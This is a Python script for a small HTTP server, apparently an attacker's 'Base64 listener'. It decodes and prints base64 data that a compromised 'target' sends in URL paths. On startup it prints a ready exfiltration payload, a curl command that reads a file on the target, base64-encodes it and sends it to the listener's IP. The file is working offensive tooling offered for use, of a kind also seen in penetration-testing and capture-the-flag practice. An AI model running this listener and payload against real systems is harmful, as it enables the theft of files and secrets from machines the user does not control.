import http.server
import socketserver
import base64
import sys
import urllib.parse # To properly handle URL paths

# --- Configuration ---
PORT = 8000 # You can change this to any port you like

# --- Request Handler ---
class Base64DecodeHandler(http.server.BaseHTTPRequestHandler):

    # Suppress default logging to keep the output clean and focused on decoded data
    def log_message(self, format, *args):
        # Log to stderr if needed for debugging the server itself
        super().log_message(format, *args)
        pass

    def do_GET(self):
        # self.path contains the full path, e.g., "/<base64_string>"
        # We need to decode the URL path first in case it contains URL-encoded characters
        decoded_path = urllib.parse.unquote(self.path)
        base64_string = decoded_path[1:] # Remove the leading '/'
        # Commenting out the response and end_headers seems to help with the script working a bit better
        if not base64_string:
            print(f"\n[*] Received GET request with empty path from {self.client_address[0]}. Ignoring.")
            self.send_response(200)
            self.end_headers()
            return

        print(f"\n--- Received Base64 String from {self.client_address[0]} ---")
        print(base64_string)

        try:
            # Base64 decoding works on bytes, so encode the string first
            decoded_bytes = base64.b64decode(base64_string.encode('ascii'))
            # Decode the bytes back to a string. Use errors='replace' to handle potential non-UTF8 characters gracefully.
            decoded_string = decoded_bytes.decode('utf-8', errors='replace')

            print("--- Decoded Content ---")
            print(decoded_string)
            print("-----------------------\n")

            # Send a successful response back to the client (the target server)
            #self.send_response(200) # 200 OK
            #self.end_headers()
            # Optional: Send a small body back
            #self.wfile.write(b"Received and decoded!")

        except base64.binascii.Error:
            print(f"--- Base64 Decode Error from {self.client_address[0]} ---", file=sys.stderr)
            print(f"Error: Invalid Base64 string received.", file=sys.stderr)
            print(f"String: {base64_string}", file=sys.stderr)
            print("---------------------------\n", file=sys.stderr)
            # Send a bad request response if decoding fails
            self.send_response(400) # 400 Bad Request
            self.end_headers()
            self.wfile.write(b'Invalid Base64 string')

        except Exception as e: # Catch any other unexpected errors
            print(f"--- Unexpected Error from {self.client_address[0]} ---", file=sys.stderr)
            print(f"Error: {e}", file=sys.stderr)
            print("------------------------\n", file=sys.stderr)
            # Send an internal server error response
            self.send_response(500) # 500 Internal Server Error
            self.end_headers()
            self.wfile.write(b'Internal Server Error')

# --- Server Setup ---
def run_server(port):
    # This allows reusing the address if the script is stopped and immediately restarted
    socketserver.TCPServer.allow_reuse_address = True
    try:
        httpd = socketserver.TCPServer(("", port), Base64DecodeHandler)
    except OSError as e:
        print(f"Error starting server on port {port}: {e}", file=sys.stderr)
        print("Perhaps the port is already in use or you need root privileges.", file=sys.stderr)
        sys.exit(1)


    print(f"[*] Base64 Listener started on port {port}")
    print(f"[*] Make sure {get_your_ip() if get_your_ip() else 'YOUR_IP'} is accessible by the target.")
    print(f"[*] Waiting for incoming Base64 encoded data in URL paths...")
    print(f"[*] Use payload: curl http://YOUR_IP:{port}/$(cat /path/to/file | base64 -w 0)")


    try:
        # Start the server, handle KeyboardInterrupt for clean shutdown
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down server.")
        httpd.shutdown()
        sys.exit(0) # Exit cleanly

# --- Helper to get potential IP (optional, for display purposes) ---
def get_your_ip():
    try:
        # Connect to a public server (doesn't send data) to get your local IP
        s = socketserver.socket(socketserver.AF_INET, socketserver.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        your_ip = s.getsockname()[0]
        s.close()
        return your_ip
    except Exception:
        return None

# --- Main Execution ---
if __name__ == "__main__":
    # Allow specifying port as a command-line argument
    if len(sys.argv) > 1:
        try:
            PORT = int(sys.argv[1])
            if not 1024 <= PORT <= 65535:
                 print("Warning: Ports below 1024 usually require root. Choose a port between 1024 and 65535.", file=sys.stderr)
        except ValueError:
            print(f"Usage: python3 {sys.argv[0]} [port]", file=sys.stderr)
            sys.exit(1)

    run_server(PORT)
